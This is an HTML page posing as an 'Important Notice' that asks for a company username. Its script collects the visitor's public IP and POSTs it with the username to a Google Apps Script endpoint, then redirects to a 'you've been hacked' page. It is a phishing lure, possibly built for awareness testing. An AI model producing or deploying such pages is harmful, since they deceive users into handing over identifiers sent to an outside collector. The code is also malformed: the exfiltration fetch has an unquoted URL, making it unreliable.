<!DOCTYPE html>
<html>
<head>
  <title>Important Notice</title>
</head>
<body>
  <h1>Please Enter Your Username</h1>
  <p>To view this important announcement, please enter your company username below:</p>

  <input type="text" id="username-input" placeholder="Username">
  <button onclick="redirectToHackedPage()">Submit</button>

  <script>
    function redirectToHackedPage() {
      var username = document.getElementById('username-input').value;

      // Get the IP address (this might not be accurate due to public IP)
      var ipAddress = "unknown";
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          ipAddress = data.ip;
        })
        .catch(error => {
          console.error("Error fetching IP address:", error);
        })
        .finally(() => {
          // Send the data to the Google Sheet
          fetch(https://script.google.com/macros/s/AKfycbxAaDsZlmV4AK_cWdAU1xDMODJb2xcP9PjlAOqX3Tk/dev) {
            method: 'POST',
            body: new URLSearchParams({
              ip: ipAddress,
              username: username
            })
          })
          .then(response => response.text())
          .then(data => console.log(data))
          .catch(error => console.error('Error sending data:', error));

          // Redirect to the "You've been hacked" page
          window.location.href = 'youve-been-hacked.html';
        });
    }
  </script>
</body>
</html>
